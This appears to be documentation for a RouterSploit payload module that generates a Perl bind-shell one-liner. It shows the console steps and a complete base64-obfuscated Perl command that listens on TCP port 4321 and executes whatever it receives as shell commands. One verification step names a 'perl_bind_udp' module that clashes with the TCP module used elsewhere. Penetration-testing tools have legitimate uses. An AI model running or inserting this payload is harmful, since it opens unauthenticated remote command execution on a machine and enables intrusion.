## Description

Module generates payload that creates interactive tcp bind shell by using perl one-liner. 

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/cmd/perl_bind_udp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates perl tcp bind shell payload.

## Scenarios

```
rsf > use payloads/cmd/perl_bind_tcp
rsf (Perl Bind TCP One-Liner) > set rport 4321
[+] rport => 4321
rsf (Perl Bind TCP One-Liner) > run
[*] Running module...
[*] Generating payload
perl -MIO -e "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKExvY2FsUG9ydCw0MzIxLFJldXNlLDEsTGlzdGVuKS0+YWNjZXB0OyR+LT5mZG9wZW4oJGMsdyk7U1RESU4tPmZkb3BlbigkYyxyKTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTs='));"
```
